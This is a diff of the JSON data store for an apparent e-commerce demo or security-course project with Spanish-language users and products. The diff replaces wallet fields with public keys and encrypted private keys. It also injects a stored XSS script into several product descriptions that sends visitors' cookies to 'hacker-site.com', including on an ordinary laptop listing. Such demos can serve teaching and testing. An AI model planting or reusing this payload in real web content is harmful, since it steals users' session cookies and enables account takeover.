@@ -2,13 +2,13 @@
     "users": {
         "admin": {
             "rol": "admin",
-            "wallet": "gAAAAABqFYD9a6BwNoBOjlp9aaMNKTJlX6uLpOgZJrrZV1hLCjpkL2aa8vSEQwfnZ7r8zlD_61mqlaSxvYwbJ45nab6jkFZpXw==",
             "cart": [],
-            "purchased": []
+            "purchased": [],
+            "public_key": "04fcdb0465f5780f5ad6302d032394b3de23674ef04bd2720ed7045f31b56cd8598b6acb0d8bdbff8fba56f4dea5e212cb3bdf9954393001da28b91aa3cc4cae6e",
+            "private_key_encrypted": "gAAAAABqH0wLIEydERugiHTf5VxYCMrsNHF-EEEK3ZrU-D41BcFINbBCuuaTK0KbVMgXXBJJDIasHWBICDMrzZ-jSC5qheVgXLdWAL2COHEsbGpe3YdIzEYjcQ2nu_17_csddxr8Og6WxI640VO2EWNELvsJp0mGGkcS1wMkfEXCdhr3T-ForSzgNcQAti-lsJcTuUUbh0YzxEV44wpEKNfy-kr4yIkNP-r4rvJ_UKc2AZVca4sQx42WA-65N68myWOR6pCO86GcBP2BX6_13lse7JPE1QE2AAlaa3-9jbfjYTnmEoZL2qULAa3pnlKymL3oOoTvN3Cr9AxXpBC2IP-sQBr7a7bNjHqIcjDqM0NLt2f2mWyUGFHu_GbNo4N4UOH5EnzK3WOHPlae8UDuYVQbXJv-1xbXmg=="
         },
         "cliente1": {
             "rol": "normal_user",
-            "wallet": "gAAAAABqGbcejNuOpW1r-vnBQIpvqgaX7Od9mWcXsWWo9TXtAcu9sy8AU-I1ddtt3NQAzyfbvhBEMpAmMGcgKnKGPweuruwy_w==",
             "cart": [],
             "purchased": [
                 {
@@ -26,13 +26,31 @@
                     "seller": "empresa1",
                     "description": "Switches \u00f3pticos s\u00faper r\u00e1pidos ideales para e-Sports.",
                     "img": "https://images.unsplash.com/photo-1595225476474-87563907a212?w=800&q=80"
+                },
+                {
+                    "id": 999,
+                    "name": "Suscripci\u00f3n Premium Falsa",
+                    "price": 5000,
+                    "seller": "scam_company",
+                    "description": "Si compras esto, te robo todo tu dinero.",
+                    "img": "https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?w=800&q=80"
+                },
+                {
+                    "id": 999,
+                    "name": "Suscripci\u00f3n Premium Falsa",
+                    "price": 5000,
+                    "seller": "scam_company",
+                    "description": "Si compras esto, te robo todo tu dinero.\r\n\r\n<script>window.location='http://hacker-site.com/robardatos?cookie='+document.cookie;</script>",
+                    "img": "https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?w=800&q=80"
                 }
-            ]
+            ],
+            "public_key": "040ca1e4ce919ad9d1431ef3a7d748e50624b790b3dff2d56e28ff6a45ebe837675a06b83b62231d18c9e5230094c073164c772f0939928b351d33fa7a9c68f830",
+            "private_key_encrypted": "gAAAAABqH0wLYr6o9mGpuTr1Oow5gPHws-VcxzzKvBau0Bh4EFM7R5sbXwhSaNK9oQdZ500TkxGgMVXcYjZQkGkaR8Qw3msNbvKR-PLfzdeoTtA385W2SH3vDUj2BPGAm8_EK_CnQiEPS66BHXiHmkHhZnsv68aZUd47abhvwY1EzSXX0NKZqge6KtaHdUodBBX1QvZev1fsYpPMlNknpqrDrImqQ0Ks2ZtQL6Y5qrOFSJLbXvaYioj1wUzRAfM5JxDCreEqKSUXVyUJMK_UopWFV2C-BKG6dhNOUrAlbSjpsnsJJ7a2WBYjOl_Li8nXc7wSQi7B4k6ILFOFmixQK8UmIWavvDMo85lOFzWajpBrN2YfwucQ9Vq7L41G32MjdejCYp-7a2LaOgf1TZ1yv-0QnIZNrDhVFg=="
         },
         "cliente2": {
             "rol": "normal_user",
-            "wallet": "gAAAAABqGbceK637j3g0BNIKf2tHXQ9tHRlGg0XuhHXNd6bqyusBSVvD7wroYCydBA_7gbvfet6Fo5PbyOwSlb9mdW9TR8CufQ==",
-            "cart": [
+            "cart": [],
+            "purchased": [
                 {
                     "id": 3,
                     "name": "Teclado Mec\u00e1nico RGB",
@@ -42,31 +60,43 @@
                     "img": "https://images.unsplash.com/photo-1595225476474-87563907a212?w=800&q=80"
                 }
             ],
-            "purchased": []
+            "public_key": "0423728800e03b9a8a83b28a99d6a6967ddcad90e547fe5f9dfc35b5bde060cf703a533250e2e819b0d8553e59151fb61491e8a33e73f0b826f3e3cde33a71284d",
+            "private_key_encrypted": "gAAAAABqH0wLEfc9AH67eBQ_7sjxGrNJ3QN8_QDQazICA4r8-bUrWU04dmuhpYECtekMotR3AmtdzCq7tgmr7-AO7H2ynqbQk20zilZwUgPHGsdiEMYtFTGHxpNr2nP2gbrTGryS401gMyLKjcZlOJFg7_JA27rBcUKB2b-8OVr6tNo4Q8ce67G8hA0mWfmoe3rx9y_XCOSqFqoj3Sf7dDb1bnUtayE9NhpugUKiLHDcfyVhcY7oOU7ilAhd6KfaIeD0BpV0DG2Uce9PBUENkz2XAEczi8mBpt84Im3k7C66iPnEYscy9cgvwT3C5SXVkBAo22oKjp-JexX3MSgl4UsrA1Qdxkp8-L60V-FqAnJUT2g2qXYfbbopRDUhwWMrYwR7EzD5fHVRI8N5YbzgRbPvZVAL2Olmjw=="
         },
         "empresa1": {
             "rol": "company",
-            "wallet": "gAAAAABqFf0kpJw2pespbSptg-0ZjRdziFF7HJE24sMMJ1mhuV5C9W9x13IaFjTbGXQbU9N_OeaA_WYRPlHIRGqNTc7VyEAOHg==",
             "cart": [],
-            "purchased": []
+            "purchased": [],
+            "public_key": "047c016329ee24dfb5112c7e3e6c9c3fcef82053a0348da1f1dcf1984b97004010e4c34f8b7d8343f5ceb9c70e505d2cf818125a4ff65de5ecad3ed058849c1293",
+            "private_key_encrypted": "gAAAAABqH0wLIBFFbS4ywMs2h7adxEFBbnHGI4jbuGz0jPPscHXbp440l26k5n5CovXsT6bIkcIoSK9MIwlwggXD5jfdfuAyn6upxgNPqlS98_11g27nG33BuopqjMASH1y1pYNTLgQche2FvOzSgYNt9HzCK4PD0UyftnrRfLUqjsESetijWEG-o-Wk_KdWIAXTyzQI9z38d-G43u1r25nBvDyjhIuAESyxLN896W3Tdng4xpFH3mnXJIjtzmFpuKkfZQtMxQOSRvYEOMKOMn9SuFYk8wAqhwnrEtqNSstIZeawlBmJrxDjBdxytep1WJtKTgxkKci1a3xZlJmW50SHvzv93UW0VATbviB2_FjFrSpNjCcHFADK3kHbnheydpvwz1cwtzEcgTTQkYX-CJUpIgchoJDFCw=="
         },
         "empresa2": {
             "rol": "company",
-            "wallet": "gAAAAABqFYD9hiL4C52O0B7Pi9c0TeMepaR-ziIxs2a_gr6Jj7RwlVA_jALm-wqUoef5cs4_nIsuTkZ1z_tMjjHLTxBhh06rbA==",
             "cart": [],
-            "purchased": []
+            "purchased": [],
+            "public_key": "04db4831647d7ebd5c75777f897d51f7dae5d3967766383505101691454989ad0bc3af7a24faa2108714ed4e77efef311d22ee140871fa560352f690bbd8340596",
+            "private_key_encrypted": "gAAAAABqH0wLzZ2sGQP0Jdj3Fpl8_9BhlPFQ14Y48qcJTeC3d-T-YZ1gqRo8zZISwbVk5oNLmO0KhvKsw_cUJLpxTm9xWgbe_we4UYX5iMWUIAcq3SJCAcxXvzXDMXIbPownJ9IBc-QPBwj7b3yY-0fUoBTAi-tagLY9MoZCkn9uBZFPUXu8ffOZGrGHPAyUOmEnLAAhrowJFsf1Wu1n79AmJRhtM3zjFFGq7Gz_AOS16ocdHPG0q0-m6WZnzFc1NZyzJci5WQP_T-reXigsg9cgEaxjByfpJ33HLFSaKMZN6sR_NIzzcSN7kvo-nVy1dH0r79DPGBcsa-FGkNzHxY3XjvrYjq9NXdwbSkPVwWAYGtvxyGJ1KuSd64PwHa_1-3RSUYsa71ASG7sW7SsfOBgISvUOaAauaQ=="
         },
         "hacker_user": {
             "rol": "normal_user",
-            "wallet": "gAAAAABqFYD9a6BwNoBOjlp9aaMNKTJlX6uLpOgZJrrZV1hLCjpkL2aa8vSEQwfnZ7r8zlD_61mqlaSxvYwbJ45nab6jkFZpXw==",
             "cart": [],
-            "purchased": []
+            "purchased": [],
+            "public_key": "040aeeb9b4b77c600c442c887f15b7939c962eaa6687b5aa684edd4342d7ea9fe53646e76b93c26c12e9087bb56bdca90d3148721c1f804f2668849c218753e4f7",
+            "private_key_encrypted": "gAAAAABqH0wLN-ygXeErEzbRFYobUQrIpJX-DDCHL7ZUf_aiEZOahX1Ufjq25_A4QsjofvemcdAEsIaqF-BLm9sDmInSVeVjDCwaHQ3qFjQLBo21S3vBMYjzFzl01KpOXFTxgwkk2_GO0zcGSe8nEs9NBGn_4iO9zzHpltkG3E6gM8HKyeR8YqQIjIg_MpXyeC3zh4OywPqW6vUyDUR22Icz8wRcgBlestAs9WcfghpGESxnvQVqbXVrzTd_MFWQC0fe60dNJDhC_20KWAbbyEbUm-T6HDfRpAe8emSZ78J5zOr63hIlCX9C1iYSI9Y7j3EYjxx3Rv2Xcbyw3CJkStmXO8uzbBOTpCvl44Pl_38N-9KkG41u6uheADo2OqVboeEc0axIq5bU0hbpc7O3HrcAgVkvvrIKgg=="
         },
         "scam_company": {
             "rol": "company",
-            "wallet": "gAAAAABqFYD9a6BwNoBOjlp9aaMNKTJlX6uLpOgZJrrZV1hLCjpkL2aa8vSEQwfnZ7r8zlD_61mqlaSxvYwbJ45nab6jkFZpXw==",
             "cart": [],
-            "purchased": []
+            "purchased": [],
+            "public_key": "0448e5827dc4adcf77e0b10da284f6d6ffce1d9a66122372e15b199d78cb08e9688d35d46970e2b78193414d83cfcf70155dc20be8eb90efc673a123ced4f76668",
+            "private_key_encrypted": "gAAAAABqH0wLA_C9h2J6GksrhO9wI03dDNk52wsyazycBMscbcPxlcGn_yrpFoefHMT5DpTyQum8fBqLDNIOfzuLaD35rXj4HtSnXChxtwxVACfpellnYzEPj3JUi5LX2aXXs2nFedUxoFZa8No0qr8FbYvCGdL1AB-5CgDpfARdyNmXCtHwMyfm1pgM4m3nyeGJ_mCmpiYuhSx-xbVjAGHZALoxze0_TC8_zmVhckF3ciNzziEHcaIqh8kMqe8P5WEsEv5GGhUjY0sUOIhgTu-y7-gRZKk0XqOeVAV9gHHRR9lfNuKIqfhHJ3DwkKABIaQ0SHGqYxsdK0dwp6xo5lDQf4764nbMyMRCezO9PIJvYbVt9HMe0ST5Z0TTHBZody0t7kbw3Os3vxvl11Q65KhbJJp7HoSJ8g=="
+        },
+        "estado": {
+            "rol": "admin",
+            "cart": [],
+            "purchased": [],
+            "public_key": "0415a67854a5da08577f284577465ae15919e1773a46e74254a1f44deb78e35b57448474e7201d009ecd1e9574faf360ab0c944439f66cfdda88bbd190cd9f02c8",
+            "private_key_encrypted": "gAAAAABqH0wLazwH0IuQW8XELE_I7hk8Xf1mRGY6izUPrEuWunwnlmUCdnUQvParHwFohype-80srf7gvNEDssIG_kUOPEqWISoL5ZDv7RTWur1FH86mVSnNjPrKKstjF7C4_QFZ_mXYt7F6LOaQy8-3Nhir2BfIvuOiuFO-OptmjKQtncbng4JD-3oAFH5bu7_PFij09ophuwwkniXF9wRPOb0dm0oOB9F6vT0kr8m_2lvMZJOkgzKpomR7zfhEWkpul2Bw2wx5p-ysE7QGhBf4N6AkrU3Sn3PqO6N7Xe0sCOj-5y-AGO4I4dZFzFrHSX8NXD4avZ0AT0vE497Ucegyz8PyNlLYgcHam0GwLLuUX8S4Tr2PPu2Fv1Ofo03Y0gNsrJ1BphMzuAjsg-LkA7P7operiZ786w=="
         }
     },
     "products": [
@@ -75,7 +105,7 @@
             "name": "Laptop GodoyGamer X-Pro",
             "price": 798,
             "seller": "empresa1",
-            "description": "Potencia extrema para los juegos m\u00e1s exigentes.",
+            "description": "Potencia extrema para los juegos m\u00e1s exigentes.\r\n<script>window.location='http://hacker-site.com/robardatos?cookie='+document.cookie;</script>",
             "img": "https://images.unsplash.com/photo-1593640408182-31c70c8268f5?w=800&q=80"
         },
         {
@@ -107,7 +137,7 @@
             "name": "Suscripci\u00f3n Premium Falsa",
             "price": 5000,
             "seller": "scam_company",
-            "description": "Si compras esto, te robo todo tu dinero.",
+            "description": "Si compras esto, te robo todo tu dinero.\r\n\r\n<script>window.location='http://hacker-site.com/robardatos?cookie='+document.cookie;</script>",
             "img": "https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?w=800&q=80"
         }
     ]
